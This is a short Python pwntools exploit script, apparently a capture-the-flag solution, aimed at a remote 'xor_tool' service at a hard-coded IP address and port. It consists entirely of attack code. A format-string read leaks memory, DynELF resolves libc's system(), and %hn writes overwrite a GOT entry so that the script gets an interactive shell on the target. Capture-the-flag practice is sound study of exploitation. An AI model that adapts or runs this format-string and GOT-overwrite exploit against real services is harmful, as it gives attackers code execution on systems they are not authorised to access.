from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = '139.59.61.220', 32345
r = remote(HOST, PORT)

def leak(addr):
	r.sendline('2')
	r.recvuntil('decrypt:')
	r.send('\x00a')
	r.sendline('%12$s\n' + p32(addr))
	r.recvuntil('msg :')
	data = r.recvuntil('Enter', drop=True)[:-1] + '\x00'
	print hex(addr), `data`
	return data

print `leak(0x8048000)`

d = DynELF(leak, 0x8048000, elf=ELF('xor_tool'))
system = d.lookup('system', 'libc')
print hex(system)
r.sendline('2')
r.recvuntil('decrypt:')
r.send('\x00a')
r.sendline(('%' + str(system & 0xffff) + 'c%20$hn%' + str(65536 + (((system >> 16) - 0) - (system & 0xffff)) & 0xffff) + 'c%21$hn').ljust(38, '\n') + p32(0x804a024) + p32(0x804a026))
print `r.recvuntil('msg :')`
r.sendline('2')
print r.recvuntil('decrypt:')
r.send('\x00a')
r.sendline('sh')
r.interactive()